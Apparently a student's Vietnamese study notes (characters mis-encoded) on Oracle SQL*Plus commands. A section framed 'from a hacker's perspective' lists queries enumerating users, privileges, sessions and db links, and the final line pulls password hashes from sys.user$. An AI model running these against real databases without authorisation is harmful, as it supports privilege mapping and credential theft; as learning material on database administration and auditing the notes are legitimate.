    | L·ªánh                    | M√¥ t·∫£                      | V√≠ d·ª•                     |
    | ----------------------- | -------------------------- | ------------------------- |
    | `SET LINESIZE n`        | Chi·ªÅu d√†i d√≤ng             | `SET LINESIZE 200`        |
    | `SET PAGESIZE n`        | S·ªë d√≤ng m·ªói trang          | `SET PAGESIZE 50`         |
    | `SET HEADING ON/OFF`    | B·∫≠t/t·∫Øt ti√™u ƒë·ªÅ c·ªôt        | `SET HEADING OFF`         |
    | `COLUMN col FORMAT A30` | ƒê·ªãnh d·∫°ng c·ªôt              | `COLUMN ename FORMAT A20` |
    | `SET FEEDBACK ON/OFF`   | Hi·ªÉn th·ªã ‚Äúx rows selected‚Äù | `SET FEEDBACK OFF`        |
    
    üí° Nh√≥m 8 ‚Äì Bi·∫øn bind & thao t√°c n·ªôi b·ªô
    | L·ªánh                | M√¥ t·∫£           | V√≠ d·ª•               |
    | ------------------- | --------------- | ------------------- |
    | `VARIABLE x NUMBER` | T·∫°o bi·∫øn bind   | `VARIABLE a NUMBER` |
    | `EXEC :x := 10;`    | G√°n gi√° tr·ªã     | `EXEC :a := 10;`    |
    | `PRINT x`           | In gi√° tr·ªã bi·∫øn | `PRINT a`           |
    
    ‚ö° Nh√≥m 9 ‚Äì L·ªánh h·ªá th·ªëng & ti·ªán √≠ch
    | L·ªánh            | M√¥ t·∫£           | V√≠ d·ª•                           |
    | --------------- | --------------- | ------------------------------- |
    | `HOST` ho·∫∑c `!` | Ch·∫°y l·ªánh shell | `HOST ls -l`                    |
    | `PROMPT text`   | In ra d√≤ng ch·ªØ  | `PROMPT === B·∫Øt ƒë·∫ßu ===`        |
    | `PAUSE`         | T·∫°m d·ª´ng script | `PAUSE Press Enter to continue` |
    
    üö® Nh√≥m 10 ‚Äì X·ª≠ l√Ω l·ªói & h√†nh vi
    | L·ªánh                       | M√¥ t·∫£                      | V√≠ d·ª•                      |
    | -------------------------- | -------------------------- | -------------------------- |
    | `WHENEVER SQLERROR EXIT 1` | Tho√°t khi c√≥ l·ªói SQL       | `WHENEVER SQLERROR EXIT 1` |
    | `WHENEVER OSERROR EXIT`    | Tho√°t khi l·ªói h·ªá ƒëi·ªÅu h√†nh | `WHENEVER OSERROR EXIT`    |
    
    üîç Nh√≥m 11 ‚Äì Th√¥ng tin h·ªá th·ªëng
    | L·ªánh        | M√¥ t·∫£                  | V√≠ d·ª•       |
    | ----------- | ---------------------- | ----------- |
    | `SHOW USER` | Hi·ªÉn th·ªã user hi·ªán t·∫°i | `SHOW USER` |
    | `SHOW ALL`  | Xem to√†n b·ªô c√†i ƒë·∫∑t    | `SHOW ALL`  |
    | `HELP`      | M·ªü tr·ª£ gi√∫p SQL*Plus   | `HELP`      |

==================================== T√¥i th·∫•y c√°i n√†y ƒÉn h·∫°i ch·∫£ d√πng g√¨ - END ====================================




==================================== Nh·ªØng c√¢u l·ªánh c·∫ßn nh·ªõ d∆∞·ªõi g√≥c nh√¨n hacker - START ====================================


SELECT username, account_status, created FROM dba_users ORDER BY username;

SELECT username FROM dba_users WHERE account_status = 'OPEN';

SELECT grantee, granted_role FROM dba_role_privs WHERE granted_role IN ('SYSDBA','SYSOPER');

SELECT grantee, privilege FROM dba_sys_privs ORDER BY grantee;

SELECT owner, table_name FROM dba_tables WHERE owner NOT IN ('SYS','SYSTEM') ORDER BY owner, table_name;

SELECT synonym_name, table_owner, table_name FROM dba_synonyms WHERE owner='PUBLIC';

SELECT sid, serial#, username, osuser, machine, program, status, logon_time FROM v$session;

# tr√™n server (OS), ki·ªÉm tra listener
lsnrctl status
tnsping <SERVICE_NAME>

M·ªôt s·ªë truy v·∫•n ki·ªÉm tra scheduler / db links:
  -- db links
  SELECT owner, db_link, username FROM dba_db_links;
  
  -- scheduled jobs
  SELECT owner, job_name, enabled, state FROM dba_scheduler_jobs;

==================================== Nh·ªØng c√¢u l·ªánh c·∫ßn nh·ªõ d∆∞·ªõi g√≥c nh√¨n hacker - END ====================================






B√†i t·∫≠p nh·∫£m nh√≠ qu√° 

select name, password from sys.user$; 























